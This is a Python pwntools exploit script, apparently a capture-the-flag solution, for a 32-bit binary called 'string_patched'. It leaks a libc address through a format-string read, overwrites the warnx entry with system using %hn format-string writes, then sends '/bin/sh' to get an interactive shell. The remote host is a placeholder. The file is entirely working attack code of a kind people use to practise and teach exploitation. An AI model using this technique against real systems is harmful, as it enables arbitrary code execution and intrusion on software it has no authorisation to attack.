#!/usr/bin/env python3
from pwn import *

exe = ELF('string_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

s= lambda data : p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            b *main
            
        ''')


if args.REMOTE:
    p = remote('host', 1337)
else:
    p = process(exe.path)


GDB()


payload = b'%71$p' #0xf4266864

sla(b'> ', b'1')
sla(b'Input: ',payload)


sla(b'> ', b'2')
p.recvuntil(b'string_patched: ')
leak_address = int(p.recvuntil(b'\n'),16)
libc.address= leak_address - 0x18637
log.info(b'leak_address: ' + hex(leak_address).encode())
log.info(b'libc_address: ' + hex(libc.address).encode())
system_address= libc.address +0x3a940
log.info(b'system_address: ' + hex(system_address).encode())

binsh_address= libc.address + 0x15902b
log.info(b'binsh_address: ' + hex(binsh_address).encode())
pop_ebx_address=0x0804888b
log.info(b'ebx_address: ' + hex(pop_ebx_address).encode())

part1 = system_address & 0xffff
part2 = (system_address >> 16) & 0xffff
diff = (part2 - part1) & 0xffff   # tự động xử lý trường hợp part2 < part1
payload = f'%{part1}c%25$hn'.encode()
payload += f'%{diff}c%24$hn'.encode()
payload = payload.ljust(0x40)  
warnx_address=0x804a02c
payload += p32(warnx_address)
payload += p32(warnx_address+2)
payload += p32(warnx_address)
payload += p32(warnx_address+2)
payload += p32(warnx_address)
payload += p32(warnx_address+2)
payload += p32(warnx_address)
payload += p32(warnx_address+2)
sla(b'> ', b'1')
sla(b'Input: ',payload)

sla(b'> ', b'2')

payload= b'/bin/sh'
sla(b'> ', b'1')
sla(b'Input: ',payload)

sla(b'> ', b'2')

p.interactive()












